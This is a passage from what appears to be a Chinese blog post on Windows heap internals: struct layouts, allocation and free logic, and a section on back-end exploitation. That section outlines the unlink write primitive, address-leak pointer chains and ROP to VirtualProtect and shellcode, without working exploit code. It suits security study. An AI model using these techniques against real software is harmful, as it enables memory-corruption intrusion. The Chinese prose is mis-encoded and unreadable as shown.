class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_UNPACKED_ENTRY</span> <span class="title">UnpackedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* PreviousBlockPrivateData;                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT Size;                                            <span class="comment">//0x8</span></span><br><span class="line">                    UCHAR Flags;                                            <span class="comment">//0xa</span></span><br><span class="line">                    UCHAR SmallTagIndex;                                    <span class="comment">//0xb</span></span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG SubSegmentCode;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT PreviousSize;                                    <span class="comment">//0xc</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        UCHAR SegmentOffset;                                <span class="comment">//0xe</span></span><br><span class="line">                        UCHAR LFHFlags;                                     <span class="comment">//0xe</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                    UCHAR UnusedBytes;                                      <span class="comment">//0xf</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG CompactHeader;                                    <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_EXTENDED_ENTRY</span> <span class="title">ExtendedEntry</span>;</span>                          <span class="comment">//0x0</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* Reserved;                                                 <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    USHORT FunctionIndex;                                   <span class="comment">//0x8</span></span><br><span class="line">                    USHORT ContextValue;                                    <span class="comment">//0xa</span></span><br><span class="line">                &#125;;</span><br><span class="line">                ULONG InterceptorValue;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">            USHORT UnusedBytesLength;                                       <span class="comment">//0xc</span></span><br><span class="line">            UCHAR EntryOffset;                                              <span class="comment">//0xe</span></span><br><span class="line">            UCHAR ExtendedBlockSignature;                                   <span class="comment">//0xf</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            VOID* ReservedForAlignment;                                     <span class="comment">//0x0</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">            &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                &#123;</span></span><br><span class="line">                    ULONG Code1;                                            <span class="comment">//0x8</span></span><br><span class="line">                    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">                    &#123;</span></span><br><span class="line">                        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">                        &#123;</span></span><br><span class="line">                            USHORT Code2;                                   <span class="comment">//0xc</span></span><br><span class="line">                            UCHAR Code3;                                    <span class="comment">//0xe</span></span><br><span class="line">                            UCHAR Code4;                                    <span class="comment">//0xf</span></span><br><span class="line">                        &#125;;</span><br><span class="line">                        ULONG Code234;                                      <span class="comment">//0xc</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                &#125;;</span><br><span class="line">                ULONGLONG AgregateCode;                                     <span class="comment">//0x8</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p> è™½è¯´è¿™ä¸ªç»“æ„ä½“æœ‰ç‚¹å¤æ‚ï¼Œä½†æ˜¯æ˜¯å–å†³äºè¿™ä¸ªchunkçš„çŠ¶æ€çš„</p><p><strong>InusedçŠ¶æ€</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;<span class="comment">//0x0</span></span><br><span class="line">    Uint2B Size;<span class="comment">//0x8</span></span><br><span class="line">    Uchar Flags;<span class="comment">//0xa</span></span><br><span class="line">    Uchar SmallTagIndex;<span class="comment">//0xb</span></span><br><span class="line">    Uint2B PreviousSize;<span class="comment">//0xc</span></span><br><span class="line">    Uchar SegmentOffset;<span class="comment">//0xe</span></span><br><span class="line">    Uchar Unusedbyte;<span class="comment">//0xf</span></span><br><span class="line">    Uchar UserData[];<span class="comment">//0x10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PreviousBlockPrivateData</code>åŸºæœ¬ä¸Šæ˜¯å‰ä¸€å—chunkçš„æ•°æ®</p><p><code>Size</code>å­˜å…¥çš„æ–¹å¼æ˜¯(size&gt;&gt;4)å³0x10å¯¹é½</p><p><code>Flag</code>è¡¨ç¤ºè¯¥chunkæ˜¯å¦inused</p><p><code>SmallTagIndex</code>æ˜¯<code>Size</code>å’Œ<code>Flags</code>æˆå‘˜ä¸‰å­—èŠ‚æ•°æ®é€ä¸ªxorç»“æœ, å–å‡ºæ—¶ä¼šè¿›è¡Œæ ¡éªŒ</p><p><code>PreviousSize</code>æ˜¯ç›¸é‚»å‰ä¸€å—chunkçš„Sizeï¼Œä¸€æ ·æ˜¯&gt;&gt;4è¿‡åçš„æ•°å€¼</p><p><code>SegmentOffset</code>æŸäº›æƒ…å†µç”¨æ¥æ‰¾segment</p><p><code>Unusebyte</code>è®°å½•user mallocåæ‰€å‰©çš„chunkç©ºé—´ï¼Œå¯ä»¥ç”¨æ¥åˆ¤æ–­chunkçš„çŠ¶æ€æ˜¯FrontEnd or BackEnd</p><p><code>UserData</code>æ˜¯Useræ‰€ä½¿ç”¨çš„åŒºå—</p><p><strong>freedçŠ¶æ€</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct _HEAP_ENTRY&#123;</span><br><span class="line">    void * PreviousBlockPrivateData;//0x0</span><br><span class="line">    Uint2B Size;//0x8</span><br><span class="line">    Uchar Flags;//0xa</span><br><span class="line">    Uchar SmallTagIndex;//0xb</span><br><span class="line">    Uint2B PreviousSize;//0xc</span><br><span class="line">    Uchar SegmentOffset;//0xe</span><br><span class="line">    Uchar Unusedbyte;//0xf</span><br><span class="line">    struct _LIST_ENTRY* Flink;//0x10</span><br><span class="line">    struct _LIST_ENTRY* Blink;//0x18</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Flink</code>æŒ‡å‘linked listä¸­ä¸‹ä¸€å—chunk</p><p><code>Blink</code>æŒ‡å‘linked listä¸­ä¸Šä¸€å—chunk</p><p><code>Unusedbyte</code>æ’ä¸º0</p><h5 id="HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk"><a href="#HEAP-VIRTUAL-ALLOC-ENTRY-mmap-chunk" class="headerlink" title="_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)"></a>_HEAP_VIRTUAL_ALLOC_ENTRY(mmap chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x40 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_VIRTUAL_ALLOC_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">Entry</span>;</span>                                               <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span> <span class="title">ExtraStuff</span>;</span>                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONGLONG CommitSize;                                                   <span class="comment">//0x20</span></span><br><span class="line">    ULONGLONG ReserveSize;                                                  <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span> <span class="title">BusyBlock</span>;</span>                                           <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Flink</span>;</span>                                              <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Blink</span>;</span>                                              <span class="comment">//0x8</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY_EXTRA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT AllocatorBackTraceIndex;                                 <span class="comment">//0x0</span></span><br><span class="line">            USHORT TagIndex;                                                <span class="comment">//0x2</span></span><br><span class="line">            ULONGLONG Settable;                                             <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONGLONG ZeroInit;                                             <span class="comment">//0x0</span></span><br><span class="line">            ULONGLONG ZeroInit1;                                            <span class="comment">//0x8</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>BusyBlock</code>çš„ç»“æ„ä½“å’Œä¸Šè¿°çš„chunkçš„ç»“æ„ä½“æ˜¯ç±»ä¼¼çš„</p><p>å…¶ä¸­</p><p><code>Size</code>æ˜¯æŒ‡çš„æ˜¯<code>unused size</code>ï¼Œå­˜å‚¨æ—¶ä¹Ÿæ²¡æœ‰è¿›è¡Œ<code>size &gt;&gt; 4</code>çš„<code>shift</code>æ“ä½œ</p><p><code>UnusedBytes</code>æ’ä¸º4</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519073.png" alt="image-20250508160927164" style="zoom: 50%;" /><p>åœ¨Freeå®Œä¸€å—chunkåï¼Œä¼šå°†è¯¥chunkæ”¾åœ¨FreeListsä¸­ï¼Œä¼šæŒ‰ç…§å¤§å°å†³å®šæ’å…¥çš„ä½ç½®</p><h5 id="HEAP-BlocksIndex"><a href="#HEAP-BlocksIndex" class="headerlink" title="_HEAP-&gt;BlocksIndex"></a>_HEAP-&gt;BlocksIndex</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>ExtendedLookup</code>æŒ‡å‘ä¸‹ä¸€ä¸ªExtendedLookupï¼Œé€šå¸¸ä¸‹ä¸€ä¸ªä¼šç®¡ç†æ›´å¤§å—chunk</p><p><code>ArraySize</code>è¯¥ç»“æ„ç®¡ç†çš„æœ€å¤§chunkçš„å¤§å°ï¼Œé€šå¸¸ä¸º0x80ï¼ˆå®é™…ä¸Šæ˜¯0x800ï¼‰</p><p><code>ItemCount</code>ç›®å‰è¯¥ç»“æ„æ‰€ç®¡ç†çš„chunkæ•°</p><p><code>OutofRangeItems</code>æ˜¯è¶…å‡ºè¯¥ç»“æ„æ‰€ç®¡ç†å¤§å°çš„chunkæ•°é‡</p><p><code>BaseIndex</code>è¯¥ç»“æ„æ‰€ç®¡ç†chunkçš„èµ·å§‹index</p><p><code>ListHead</code>æŒ‡å‘FreeListçš„Head</p><p><code>ListsInUseUlong</code>ç”¨æ¥åˆ¤æ–­ListHintä¸­æ˜¯å¦æœ‰åˆé€‚å¤§å°çš„chunkï¼Œæ˜¯ä¸€ä¸ªbitmap</p><p><code>ListHint</code>ç”¨æ¥æŒ‡å‘ç›¸å¯¹åº”å¤§å°çš„chunk arrayï¼Œå¤§å°ä¸º0x10ä¸ºä¸€ä¸ªé—´éš”</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519074.png" alt="image-20250508162938606" style="zoom:50%;" /><h4 id="åˆ†é…æœºåˆ¶"><a href="#åˆ†é…æœºåˆ¶" class="headerlink" title="åˆ†é…æœºåˆ¶"></a>åˆ†é…æœºåˆ¶</h4><p>åŸºæœ¬ä¸Šåˆ†ä¸ºä¸‰ç§ï¼š</p><ul><li>Size&lt;&#x3D;0x4000</li><li>0x4000 &lt; size &lt;&#x3D;0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size"><a href="#Size" class="headerlink" title="Size &lt;&#x3D; 0x4000"></a>Size &lt;&#x3D; 0x4000</h5><ul><li><p>é¦–å…ˆä¼šçœ‹è¯¥Sizeå¯¹åº”çš„<code>FrontEndHeapStatusBitmap</code>æ˜¯å¦å¯ç”¨äº†LFH</p><ul><li>æ²¡æœ‰çš„è¯ï¼Œä¼šå¯¹å¯¹åº”çš„<code>FrontEndHeapUsageData</code>åŠ ä¸Š0x21</li><li>å¹¶ä¸”æ£€æŸ¥å€¼æ˜¯å¦è¶…è¿‡<code>0xff00</code>æˆ–<code>&amp;0x1f</code>åè¶…è¿‡0x10ï¼Œå¦‚æœé€šè¿‡è¿™ä¸ªæ¡ä»¶å°±ä¼šå¯ç”¨LFH</li></ul></li><li><p>æ¥ä¸‹æ¥ä¼šçœ‹å¯¹åº”çš„<code>ListHint</code>æ˜¯å¦æœ‰å€¼ï¼Œä¼šä»¥<code>ListHint</code>ä¸­çš„<code>chunk</code>ä¸ºä¼˜å…ˆ</p></li><li><p>å¦‚æœæœ‰å€¼ï¼Œå°±ä¼šçœ‹è¯¥chunkçš„<code>Flink</code>å¤§å°æ˜¯å¦åˆšå¥½ä¹Ÿæ˜¯åŒæ ·çš„Size</p><ul><li><p>å¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¼šå°†è¯¥ListHintå¡«ä¸ŠFlinkçš„å€¼ï¼ˆ1ï¼‰</p></li><li><p>ä¸æ˜¯åˆ™æ¸…ç©ºListHintï¼ˆ2ï¼‰</p></li><li><p>æœ€ååˆ™<code>unlink</code>è¯¥chunkï¼ŒæŠŠè¿™å—chunkä»<code>linked list</code>ä¸­ç§»é™¤ï¼Œè¿”å›ç»™ä½¿ç”¨è€…ï¼Œå¹¶å°†headerå¼‚æˆ–å›å»</p></li></ul></li><li><p>å¦‚æœæ²¡æœ‰åˆšå¥½é€‚åˆçš„</p><ul><li>ä»æ¯”è¾ƒå¤§çš„<code>ListHint</code>ä¸­æ‰¾ï¼Œæœ‰æ‰¾åˆ°å°±æ‰§è¡Œï¼ˆ1ï¼‰ï¼ˆ2ï¼‰</li><li>ç„¶åå°†è¯¥chunkè¿›è¡Œ<strong>åˆ‡å‰²</strong>ï¼Œå‰©ä¸‹å¤§å°é‡æ–°åŠ å…¥Freelistï¼Œå¦‚æœå¯ä»¥æ”¾è¿›ListHintå°±ä¼šæ”¾è¿›å»</li><li>æœ€åå›ä¼ åˆ‡å‰²å¥½çš„chunkç»™ä½¿ç”¨è€…ï¼Œå¹¶å°†headerå¼‚æˆ–å›å»</li></ul></li><li><p>å¦‚æœFreelistä¸­éƒ½æ²¡æœ‰</p><ul><li>å°è¯•<code>ExtendHeap</code>åŠ å¤§Heapç©ºé—´</li><li>å†ä»<code>extend</code>å‡ºæ¥çš„chunkæ‹¿</li><li>æ¥ç€åé¢ä¸€æ ·åˆ‡å‰²ï¼Œæ”¾å›<code>ListHint</code>ï¼Œè¿˜åŸHeader</li></ul></li></ul><h5 id="0x4000-size"><a href="#0x4000-size" class="headerlink" title="0x4000 &lt; size &lt;&#x3D;0xff000"></a>0x4000 &lt; size &lt;&#x3D;0xff000</h5><ul><li>é™¤äº†æ²¡æœ‰å¯¹LFHç›¸å…³æ“ä½œå¤–ï¼Œå…¶ä½™éƒ½è·Ÿ0x4000ä¸€æ ·</li></ul><h5 id="Size-0xff000"><a href="#Size-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>ç›´æ¥ä½¿ç”¨<code>ZwAllocateVirtualThreshold</code></li><li>ç±»ä¼¼mmapç›´æ¥ç»™ä¸€å¤§å—ï¼Œå¹¶ä¸”ä¼šæ’å…¥<code>_HEAP-&gt;VirtualAllocdBlocks</code>è¿™ä¸ª<code>linked list</code>ä¸­<ul><li>è¿™ä¸ªlinked listæ˜¯ä¸²æ¥è¯¥<code>Heap VirtualAllocate</code>å‡ºæ¥çš„åŒºæ®µç”¨çš„</li></ul></li></ul><h4 id="Freeæœºåˆ¶"><a href="#Freeæœºåˆ¶" class="headerlink" title="Freeæœºåˆ¶"></a>Freeæœºåˆ¶</h4><p>å¯åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li>Size &lt;&#x3D; 0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size-1"><a href="#Size-1" class="headerlink" title="Size &lt;&#x3D; 0xff000"></a>Size &lt;&#x3D; 0xff000</h5><ul><li><p>ä¼šå…ˆ<strong>æ£€æŸ¥</strong>alignmentï¼Œåˆ©ç”¨unused byteåˆ¤æ–­è¯¥chunkçŠ¶æ€</p><ul><li>å¦‚æœæ˜¯LFHä¸‹ï¼Œå¯¹åº”çš„FrontEndHeapUsageDataå‡1</li><li>æ¥ç€ä¼šåˆ¤æ–­å‰åçš„chunkæ˜¯å¦ä¸ºfreedï¼Œæ˜¯çš„è¯åˆå¹¶<ul><li>æ­¤æ—¶ä¼šæŠŠå¯ä»¥åˆå¹¶çš„chunkåšunlinkï¼Œå¹¶å°†ListHintç§»é™¤</li><li>ç§»é™¤æ–¹å¼ä¸å‰é¢ç›¸åŒï¼Œçœ‹çœ‹ä¸‹ä¸€å—æ˜¯ä¸æ˜¯åŒæ ·å¤§å°ï¼Œä½¿å¾—è¯è¡¥ä¸ŠListHint</li></ul></li></ul></li><li><p>åˆå¹¶å®Œï¼Œupdate sizeå’Œprevsizeï¼Œç„¶åä¼šçœ‹çœ‹æ˜¯ä¸æ˜¯åœ¨FreeListçš„æœ€å‰æˆ–æœ€åï¼Œæ˜¯çš„è¯å°±æ’å…¥FreeListï¼Œä¸æ˜¯å°±ä»ListHintä¸­æ’å…¥ï¼Œå¹¶ä¸”update ListHintï¼Œæ’å…¥æ—¶ä¹Ÿä¼šå¯¹<code>linked list</code>åš<strong>æ£€æŸ¥</strong></p><ul><li>ä½†æ˜¯è¿™ä¸ªæ£€æŸ¥ä¸ä¼šabortï¼Œå…¶åŸå› æ˜¯å¦‚æœæ£€æŸ¥å¤±è´¥æ˜¯ä¸ä¼šåšunlinkå†™å…¥çš„</li></ul></li></ul><h5 id="Size-0xff000-1"><a href="#Size-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>æ£€æŸ¥è¯¥chunkçš„linked listï¼Œå¹¶ä»<code>_HEAP-&gt;VirtualAllocdBlocks</code>ç§»é™¤</li><li>æ¥ç€ä½¿ç”¨<code>RtlpSecaMemFreeVirtualMemory</code>å°†chunkæ•´ä¸ªmunmapæ‰</li></ul><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><h4 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h4><p>åŸºæœ¬ä¸Šä¸Linuxä¸­çš„unlinkå¾ˆç±»ä¼¼ï¼Œç»•è¿‡æ–¹æ³•å·®ä¸å¤šï¼Œç®€è€Œè¨€ä¹‹æ˜¯åˆ©ç”¨ä»linked listç§»é™¤nodeçš„è¡Œä¸ºæ¥åšæœ‰é™åˆ¶çš„å†™å…¥</p><p>è¦æ³¨æ„çš„æ˜¯åœ¨ä¼šdecodeçš„åœ°æ–¹ï¼Œéƒ½è¦è®©ä»–æ­£å¸¸decodeï¼Œä¹Ÿå°±æ˜¯check sumè¦é€šè¿‡</p><p>å¦å¤–ä¸€ç‚¹æ˜¯<strong>FlinkåŠBlink</strong>å¹¶ä¸æ˜¯æŒ‡å‘chunkå¼€å¤´ï¼Œè€Œæ˜¯<strong>ç›´æ¥æŒ‡å‘User dataéƒ¨åˆ†</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸å¤ªéœ€è¦åšåç§»ä¼ªé€ chunkï¼Œæ‰€ä»¥æ‰¾åˆ°ä¸€ä¸ªæŒ‡å‘è¯¥userdataçš„pointerè®©ä»–ç»•è¿‡double linked listçš„éªŒè¯å°±å¥½äº†</p><p>ä¸€èˆ¬æ¥è¯´Unlinkå®Œä¹‹åå°±æœ‰ä»»æ„åœ°å€è¯»å†™äº†ï¼ŒåŸºæœ¬getshellçš„æ–¹æ³•éƒ½æ˜¯é€šè¿‡ROPï¼Œé‚£ä¹ˆå°±è¦æ³„éœ²åœ°å€</p><ul><li>ä»£ç åœ°å€<ul><li><code>PEB --&gt; text</code></li></ul></li><li>å…±äº«åº“åœ°å€<ul><li><code>text --&gt; IAT --&gt; xxx.dll --&gt; xxx.dll</code></li><li><code>_HEAP-&gt;LockVariable.Lock --&gt; ntdll.dll</code></li><li><code>CrticalSection-&gt;DebugInfo --&gt; ntdll.dll</code></li></ul></li><li>æ ˆåœ°å€<ul><li><code>Kernel32.dll --&gt; kernelbase.dll --&gt; KERNELBASE!BasepFilterInfo --&gt; stack address</code></li><li><code>kernel32.dll --&gt; ntdll.dll --&gt; ntdll!PebLdr --&gt; PEB --&gt; TEB --&gt; stack address</code></li></ul></li></ul><p>è¦ä¹ˆçº¯ROPåˆ°getshellï¼Œè¦ä¹ˆROP to VirtualProtect&#x2F;VirtualAllocï¼Œç„¶åJmp to shellcode</p><h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front-End"></a>Front-End</h3><ul><li>åœ¨éDebugä¸‹æ‰ä¼šenable</li><li>Size &lt; 0x4000</li></ul><h4 id="æ•°æ®ç»“æ„-1"><a href="#æ•°æ®ç»“æ„-1" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h4><h5 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _LFH_HEAP</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +<span class="number">0x000</span> Lock             : _RTL_SRWLOCK</span><br><span class="line">   +<span class="number">0x008</span> SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +<span class="number">0x038</span> SegmentCreate    : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> SegmentDelete    : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> MinimumCacheDepth : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> CacheShiftThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> SizeInCache      : Uint8B</span><br><span class="line">   +<span class="number">0x050</span> RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +<span class="number">0x060</span> UserBlockCache   : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +<span class="number">0x2a0</span> MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +<span class="number">0x2a4</span> Buckets          : [<span class="number">129</span>] _HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x4a8</span> SegmentInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x8b0</span> AffinitizedInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0xcb8</span> SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0xcc0</span> LocalData        : [<span class="number">1</span>] 